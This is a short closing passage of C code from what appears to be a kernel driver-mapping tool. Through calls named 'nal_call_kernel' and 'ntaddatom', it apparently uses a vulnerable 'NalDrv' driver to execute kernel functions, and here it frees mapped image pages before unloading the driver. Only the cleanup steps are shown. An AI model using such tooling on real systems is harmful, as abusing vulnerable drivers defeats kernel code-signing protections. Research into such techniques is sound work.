        printf("[*] freeing independent pages...\n");
        nal_call_kernel(hDev, ntaddatom, fn_freeind,
                        ind_base, (UINT64)nth->OptionalHeader.SizeOfImage, 0, 0);
        printf("[+] freed\n");
    }

    unload_driver(hDev, L"NalDrv");
    free(pdata);
    printf("[+] done\n");
    return 0;
}
